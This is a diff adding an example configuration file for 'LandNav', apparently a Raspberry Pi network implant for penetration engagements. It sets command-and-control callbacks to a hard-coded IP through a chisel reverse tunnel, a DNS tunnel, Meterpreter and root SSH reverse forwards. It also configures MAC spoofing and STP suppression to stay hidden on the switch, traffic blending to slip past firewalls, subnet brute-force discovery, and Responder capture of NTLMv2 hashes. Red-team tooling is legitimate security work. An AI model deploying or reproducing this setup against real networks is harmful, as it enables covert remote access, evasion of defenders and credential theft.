@@ -1,0 +1,230 @@
+# ═══════════════════════════════════════════════════════════════════
+# LandNav — Engagement Configuration
+# ═══════════════════════════════════════════════════════════════════
+# Copy to config.yaml and edit before deploying the Pi.
+#   cp config.yaml.example config.yaml
+#   nano config.yaml
+# ═══════════════════════════════════════════════════════════════════
+
+# ── C2 Callback ─────────────────────────────────────────────────
+c2:
+  host: 66.194.172.172
+  ports:
+    - 4443
+    - 8443
+  # Device ID — offsets server-side listen ports so multiple appliances
+  # can connect simultaneously. "auto" looks up the hostname in
+  # device_registry.json (sequential IDs assigned during provisioning).
+  # Set an explicit integer to override.
+  device_id: auto
+  # Retry interval (seconds) when all C2 methods fail.
+  # LandNav will cycle through every method, wait this long, then retry.
+  retry_interval: 60
+  # Maximum retries before entering long-backoff (0 = unlimited)
+  max_retries: 0
+  # Long-backoff interval after max_retries exhausted (seconds)
+  backoff_interval: 300
+
+# ── Chisel HTTPS Reverse Tunnel — Primary C2 ──────────────────
+# Multiplexed reverse port forwarding + SOCKS over a single
+# WebSocket connection on port 443.  Looks like normal HTTPS to
+# DPI — the most reliable egress through enterprise firewalls.
+#
+# chisel server must be running on the C2 server — listener.rc starts
+# it automatically.
+#
+# If forwards are omitted here, the ssh_tunnels.forwards list is
+# reused — configure in one place, both transports honour it.
+chisel:
+  enabled: true
+  # Port the chisel server listens on (C2 server side)
+  server_port: 443
+  # Shared auth — must match chisel server's --auth flag
+  auth: "landnav:changeme"
+  # Use TLS (should be true for port 443 — matches normal HTTPS)
+  tls: true
+  # SOCKS5 proxy port on C2 server via chisel (0 = disabled)
+  # Separate from Metasploit's SOCKS proxy on :1080 (which routes
+  # through meterpreter sessions).  Chisel SOCKS is a native TCP
+  # tunnel — faster and doesn't starve the meterpreter channel.
+  #   proxychains -q nmap -sT -p- <target_subnet>
+  socks_port: 1081
+  # Reconnection tuning — chisel retries indefinitely by default
+  keepalive: 25s
+  max_retry_interval: 30s
+  # Optional HTTP headers to blend with legitimate traffic
+  # (e.g. match the Host header of a real site behind the same IP)
+  headers: {}
+  #   Host: portal.example.com
+  # Forwards (optional — if empty, inherits ssh_tunnels.forwards):
+  # forwards:
+  #   - local_port: 25100
+  #     remote_port: 5100
+  #     remote_host: 127.0.0.1
+
+# ── DNS Tunnel (iodine) — Secondary C2 ─────────────────────────
+dns_tunnel:
+  enabled: true
+  # Tunnel domain — used by iodine as the tunnel identifier
+  domain: t.example.com
+  # Direct mode — connect to C2 server on UDP/53 instead of relying
+  # on recursive DNS resolution (no NS delegation required)
+  nameserver: 66.194.172.172
+  # Shared secret between iodine client and iodined server
+  password: changeme
+  # Tunnel network (iodined server-side subnet for the dns0 interface)
+  tunnel_net: 10.53.53.1/24
+  # Maximum downstream fragment size (auto-detected if 0)
+  max_downstream_frag: 0
+  # Encoding: NULL, BASE32, BASE64, BASE128, RAW
+  encoding: ""
+  # Lazy mode (fewer queries when idle, saves bandwidth)
+  lazy_mode: true
+
+# ── Python Meterpreter — Secondary C2 ─────────────────────────
+meterpreter:
+  enabled: true
+  # Connection timeout per attempt (seconds)
+  connect_timeout: 10
+  # Retry delay between port attempts (seconds)
+  retry_delay: 5
+
+# ── SSH Reverse Tunnels — Service Access ──────────────────────
+# After meterpreter establishes, SSH reverse tunnels are started
+# independently to provide reliable access to internal services.
+# Meterpreter's single-threaded transport starves under web/TLS
+# traffic — SSH tunnels bypass this entirely with native TCP
+# multiplexing over a separate connection.
+#
+# Requires:
+#   1. SSH key pair: deploy script generates keys/tunnel_key{,.pub}
+#   2. Public key in C2 server's authorized_keys (restrict=tunnel-only)
+#   3. SSH binary available on the appliance
+ssh_tunnels:
+  # Path to SSH private key on the appliance
+  key_path: /opt/pr0t31n/LandNav/keys/tunnel_key
+  # SSH port on C2 server
+  ssh_port: 22
+  # SSH user on C2 server
+  ssh_user: root
+  # Port forwards: server_port → appliance_host:appliance_port
+  # Each entry creates an SSH -R reverse forward
+  forwards:
+    - local_port: 25100       # server:25100 → appliance:5100 (Vantage)
+      remote_port: 5100
+      remote_host: 127.0.0.1
+    - local_port: 25500       # server:25500 → appliance:5500 (Crucible)
+      remote_port: 5500
+      remote_host: 127.0.0.1
+    - local_port: 28834       # server:28834 → appliance:8834 (Nessus)
+      remote_port: 8834
+      remote_host: 127.0.0.1
+
+# ── Network — Bridge & Discovery ───────────────────────────────
+network:
+  bridge:
+    # Auto-detect USB-ethernet adapter for bridge mode.
+    # If no USB-ethernet found, falls back to standalone mode (eth0 only).
+    auto_detect: true
+    # Disable STP on the bridge (recommended — prevents topology change alerts)
+    stp: false
+    # Rewrite Pi's outgoing MAC to match the legitimate device.
+    # Requires ebtables. Makes the Pi invisible on the switch port.
+    mac_transparency: true
+
+  discovery:
+    # Seconds to wait for DHCP lease / sniffed DHCP exchange
+    dhcp_timeout: 30
+    # Seconds for first passive traffic sniff pass (ARP, DHCP, LLDP/CDP)
+    sniff_timeout: 60
+    # Extended sniff if first pass yields nothing
+    sniff_extended: 300
+    # Seconds per individual ARP probe
+    arp_probe_timeout: 3
+    # Enable RFC 1918 subnet brute force as last resort
+    brute_force: true
+    # Brute-force timeout — abort after this many seconds
+    brute_force_timeout: 1800
+
+  # Last octet to use when assigning the Pi a static IP.
+  # If this conflicts, tries fallback_octets in order.
+  preferred_ip_octet: 236
+  fallback_octets:
+    - 237
+    - 238
+    - 235
+    - 234
+    - 233
+    - 240
+    - 241
+
+  # Fallback DNS servers (used if none discovered from the network)
+  fallback_dns:
+    - 8.8.8.8
+    - 1.1.1.1
+
+  proxy:
+    # Attempt WPAD and common-port proxy detection
+    auto_detect: true
+    # Manual proxy override (leave empty for auto-detect only)
+    host: ""
+    port: 0
+
+# ── Passive Network Reconnaissance ────────────────────────────
+# Runs continuously from Phase 3 onward, collecting network intel
+# with zero active traffic. All output written to logs/recon/.
+passive:
+  enabled: true
+  # How often to flush collected data to disk (seconds)
+  flush_interval: 30
+  # Protocols to capture (all enabled by default):
+  #   ARP, DHCP, DNS, NetBIOS, LLMNR, mDNS, SSDP, 802.1Q, STP
+  #
+  # Output files (in logs/recon/):
+  #   hosts.json       — live host inventory (IP, MAC, hostnames, sources)
+  #   subnets.json     — observed subnets with host counts
+  #   dns_queries.log  — timestamped DNS lookups (who resolves what)
+  #   llmnr.json       — LLMNR/NBT-NS broadcast log (poisoning candidates)
+  #   services.json    — mDNS/SSDP advertised services
+  #   targets.txt      — deduplicated /24 CIDRs for scanning
+
+# ── Responder Analyzer Mode ────────────────────────────────────
+# Runs Responder with -A flag (analyze only — NO POISONING).
+# Passively observes LLMNR/NBT-NS/mDNS/WPAD broadcasts and logs:
+#   - Which hosts broadcast name queries (poisoning targets)
+#   - What names they try to resolve (stale DNS, typos)
+#   - WPAD requests (proxy auto-config poisoning candidates)
+#   - Passively observed authentication attempts (NTLMv2 hashes)
+responder:
+  enabled: true
+  # Override Responder path (auto-detected if empty).
+  # Common locations: /usr/share/responder/Responder.py, /usr/bin/responder
+  path: ""
+  #
+  # Output files (in logs/recon/responder/):
+  #   responder_stdout.log     — raw Responder output
+  #   responder_summary.json   — consolidated findings (hashes, candidates, WPAD)
+  #   *.txt                    — copied from Responder's own logs/ directory
+
+# ── LED Status ─────────────────────────────────────────────────
+led:
+  enabled: true
+  # LED sysfs path (Pi 4B green ACT LED)
+  path: /sys/class/leds/ACT
+  # Patterns:
+  #   booting      — slow heartbeat (0.5 Hz)
+  #   bridge_up    — slow blink (1 Hz)
+  #   discovery    — double blink
+  #   network_up   — fast blink (2 Hz)
+  #   c2_attempt   — triple blink
+  #   c2_connected — solid on
+  #   error        — SOS pattern
+  #   shutdown     — fade out (rapid blinks slowing down)
+
+# ── Logging ────────────────────────────────────────────────────
+logging:
+  directory: /opt/pr0t31n/LandNav/logs
+  level: INFO          # DEBUG, INFO, WARNING, ERROR
+  max_size_mb: 50      # Rotate logs after this size
+  # Log to console as well (useful for manual testing; disabled in service mode)
+  console: true
